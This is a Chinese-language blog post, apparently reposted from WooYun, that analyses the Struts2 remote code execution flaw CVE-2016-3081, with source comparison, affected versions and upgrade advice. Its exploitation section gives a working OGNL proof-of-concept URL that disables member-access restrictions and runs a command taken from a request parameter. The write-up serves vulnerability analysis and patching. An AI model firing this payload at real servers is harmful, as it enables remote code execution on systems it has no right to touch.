<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <title>
    
      CVE-2016-3081_Struts2_detial
    
  </title>

  <!-- Begin Jekyll SEO tag v2.6.1 -->
<meta name="generator" content="Jekyll v4.1.1" />
<meta property="og:title" content="CVE-2016-3081_Struts2_detial" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="0x00 漏洞简述" />
<meta property="og:description" content="0x00 漏洞简述" />
<link rel="canonical" href="https://blog.securitainment.io/pentest/struts/2016/05/14/cve-2016-3081-struts2-detial.html" />
<meta property="og:url" content="https://blog.securitainment.io/pentest/struts/2016/05/14/cve-2016-3081-struts2-detial.html" />
<meta property="og:site_name" content="Securitainment.io" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2016-05-14T08:55:51+08:00" />
<script type="application/ld+json">
{"url":"https://blog.securitainment.io/pentest/struts/2016/05/14/cve-2016-3081-struts2-detial.html","headline":"CVE-2016-3081_Struts2_detial","dateModified":"2016-05-14T08:55:51+08:00","datePublished":"2016-05-14T08:55:51+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.securitainment.io/pentest/struts/2016/05/14/cve-2016-3081-struts2-detial.html"},"description":"0x00 漏洞简述","@type":"BlogPosting","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

  <link type="application/atom+xml" rel="alternate" href="https://blog.securitainment.io/feed.xml" title="Securitainment.io" />

  <link rel="shortcut icon" type="image/x-icon" href="/" />
  <link rel="stylesheet" href="https://blog.securitainment.io/assets/css/main.css" />
</head>
<body>
    <main class="page-content" aria-label="Content">
        <div class="wrapper">
            <a href="https://blog.securitainment.io"></a>
<h1>CVE-2016-3081_Struts2_detial</h1>
<h2 id="0x00-漏洞简述">0x00 漏洞简述</h2>

<p>2016年4月21日 Struts2 官方发布两个CVE，其中 CVE-2016-3081 官方评级为高。主要原因为在用户开启动态方法调用的情况下，会被攻击者实现远程代码执行攻击。从我自己搜索的情况来看，国内开启这个功能的网站不在少数，所以这个 “Possible Remote Code Execution” 漏洞的被打的可能性还是很高的。</p>

<!--more-->

<h2 id="0x01-漏洞原理">0x01 漏洞原理</h2>

<p>直接进行版本比对，我们可以看到针对这个问题，只对 DefaultActionMapper.java 这个文件进行了修改，修改内容如下：</p>

<p><img src="http://static.wooyun.org//drops/20160426/2016042610071380042.png" alt="" /></p>

<p>我们可以看到只是把method成员变量的值进行了一次过滤，cleanupActionName 这个方法是在对 “action:” 滥用的问题进行添加的，禁止了绝大多数的特殊字符。但是在后来的版本变更中忽略了之前的问题，将 method 也引入了 Ongl 表达式，代码在 DefaultAction.java 的 invokeAction 中：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">protected</span> <span class="nc">String</span> <span class="nf">invokeAction</span><span class="o">(</span><span class="nc">Object</span> <span class="n">action</span><span class="o">,</span> <span class="nc">ActionConfig</span> <span class="n">actionConfig</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
    <span class="nc">String</span> <span class="n">methodName</span> <span class="o">=</span> <span class="n">proxy</span><span class="o">.</span><span class="na">getMethod</span><span class="o">();</span>

    <span class="k">if</span> <span class="o">(</span><span class="no">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
        <span class="no">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">"Executing action method = #0"</span><span class="o">,</span> <span class="n">methodName</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="nc">String</span> <span class="n">timerKey</span> <span class="o">=</span> <span class="s">"invokeAction: "</span> <span class="o">+</span> <span class="n">proxy</span><span class="o">.</span><span class="na">getActionName</span><span class="o">();</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="nc">UtilTimerStack</span><span class="o">.</span><span class="na">push</span><span class="o">(</span><span class="n">timerKey</span><span class="o">);</span>

        <span class="nc">Object</span> <span class="n">methodResult</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">methodResult</span> <span class="o">=</span> <span class="n">ognlUtil</span><span class="o">.</span><span class="na">getValue</span><span class="o">(</span><span class="n">methodName</span> <span class="o">+</span> <span class="s">"()"</span><span class="o">,</span> <span class="n">getStack</span><span class="o">().</span><span class="na">getContext</span><span class="o">(),</span> <span class="n">action</span><span class="o">);</span>
</code></pre></div></div>

<p>我们可以看到methodName被带入到getValue了，熟悉Struts相关漏洞的朋友应该都明白这是什么意思，虽然后面被强制添加了一对圆括号，但是想办法语法补齐就好了。相对应的我们来看下在2.3.18版本之前的代码是怎么处理methodName的：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">protected</span> <span class="nc">String</span> <span class="nf">invokeAction</span><span class="o">(</span><span class="nc">Object</span> <span class="n">action</span><span class="o">,</span> <span class="nc">ActionConfig</span> <span class="n">actionConfig</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
    <span class="nc">String</span> <span class="n">methodName</span> <span class="o">=</span> <span class="n">proxy</span><span class="o">.</span><span class="na">getMethod</span><span class="o">();</span>

    <span class="k">if</span> <span class="o">(</span><span class="no">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
        <span class="no">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">"Executing action method = #0"</span><span class="o">,</span> <span class="n">methodName</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="nc">String</span> <span class="n">timerKey</span> <span class="o">=</span> <span class="s">"invokeAction: "</span> <span class="o">+</span> <span class="n">proxy</span><span class="o">.</span><span class="na">getActionName</span><span class="o">();</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="nc">UtilTimerStack</span><span class="o">.</span><span class="na">push</span><span class="o">(</span><span class="n">timerKey</span><span class="o">);</span>

        <span class="kt">boolean</span> <span class="n">methodCalled</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
        <span class="nc">Object</span> <span class="n">methodResult</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="nc">Method</span> <span class="n">method</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">method</span> <span class="o">=</span> <span class="n">getAction</span><span class="o">().</span><span class="na">getClass</span><span class="o">().</span><span class="na">getMethod</span><span class="o">(</span><span class="n">methodName</span><span class="o">,</span> <span class="no">EMPTY_CLASS_ARRAY</span><span class="o">);</span>
</code></pre></div></div>

<p>在这里使用的是反射，所以在这个漏洞发布的时候，我曾一瞬间觉得又是一个骗CVE的鸡肋，但是事实上，这是一个威胁很大的漏洞。但是官方说的受影响版本<code class="language-plaintext highlighter-rouge">Struts 2.0.0 - Struts Struts 2.3.28 (except 2.3.20.2 and 2.3.24.2)</code>是不严谨的，应该是<code class="language-plaintext highlighter-rouge">2.3.18-2.3.28(except 2.3.20.2 and 2.3.24.2)</code>。</p>

<h2 id="0x02-漏洞利用">0x02 漏洞利用</h2>

<p>利用方式主要难点在于两个地方，一个是上文提到的对于表达式最后的圆括号给予正确的表达式意义。另一个就是在传输过程中method会经过一次转义，双引号和单引号的没有办法使用了，所以需要找到一个绕过。剩下的就是原来套沙盒绕过，命令执行的那套东西了。</p>

<p>对于圆括号，可以直接使用<code class="language-plaintext highlighter-rouge">new java.lang.String</code>这样来拼接成<code class="language-plaintext highlighter-rouge">new java.lang.String()</code>构成正确Ognl语法。</p>

<p>至于不能使用引号的话，命令执行我们可以使用引用参数的方法来完成对字符串的提取，例如：使用#parameters.cmd来提取http的cmd参数。测试PoC如下：</p>

<blockquote>
  <p>http://172.16.107.143:8080/Struts2_3_18/hello.action?cmd=gedit&amp;method:(%23_memberAccess).setExcludedClasses(@java.util.Collections@EMPTY_SET),(%23_memberAccess).setExcludedPackageNamePatterns(@java.util.Collections@EMPTY_SET),%23cmd%3d%23parameters.cmd,%23a%3dnew%20java.lang.ProcessBuilder(%23cmd).start().getInputStream(),new java.lang.String</p>
</blockquote>

<p>效果如下图所示：</p>

<p><img src="http://static.wooyun.org//drops/20160426/2016042610071333528.png" alt="" /></p>

<p>这里我小小的猜测一下，官方发布的日期是20，而漏洞提交team做宣传是在4月25日，那么是不是在提交CVE时还没有完成弹计算器的利用，还是为了符合漏洞提交规范做的延时？小八卦一下O(∩_∩)O。</p>

<h2 id="0x03-漏洞总结">0x03 漏洞总结</h2>

<p>虽然现在CVE已经发布，但是从目前网络情况上（twitter和微博）来看，并没有安全研究人员关注到这两个CVE，可能是因为官方发布过太多鸡肋的CVE了，国内的各路炒洞高手已经对Struts2麻木了。所以目前的情况是属于漏洞存在那里，发了CVE，但是没有任何人去研究利用，发布相关分析。这个漏洞和Struts2前N次被炒的热热闹闹的漏洞影响和危害相比，真是不可同日而语，这个漏洞真的很实在。</p>

<p>看到这里，打算磨拳擦掌要去调回显PoC的朋友们，这里我要在提醒一次。虽然我在之前说了存在这个问题的站点很多，但是这个漏洞存在版本限制，在Struts2.3.18及其以上的版本才可以触发。而国内大多数的站点由于Struts在2.3.16之后再也没有出现过大的问题，所以绝大多数停留在2.3.16这个版本，这让这个看似很不错的漏洞略显鸡肋了。</p>

<p><strong>防护方案</strong></p>

<p>目前官方已经推出了<code class="language-plaintext highlighter-rouge">2.3.20.2、2.3.24.2</code>和<code class="language-plaintext highlighter-rouge">2.3.28.1</code>修复了这个问题，大家可以针对自己所使用的版本进行升级。下载地址：https://struts.apache.org/download.cgi#struts23281</p>

<blockquote>
  <p>转自乌云：
http://drops.wooyun.org/papers/15430</p>
</blockquote>
<br/><p>Comments:</p>

<script src="https://utteranc.es/client.js"
        repo="5cr1pt/commnets.blog.securitainment.io"
        issue-term="url"
        theme="preferred-color-scheme"
        crossorigin="anonymous"
        async>
</script>
<div><a src='https://blog.securitainment.io'>HOME</a>
</div>
<div style="display:none">
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-137221448-1', 'auto');
    ga('send', 'pageview');

  </script>
</div>

        </div>
    </main>

    
    </body>
</html>
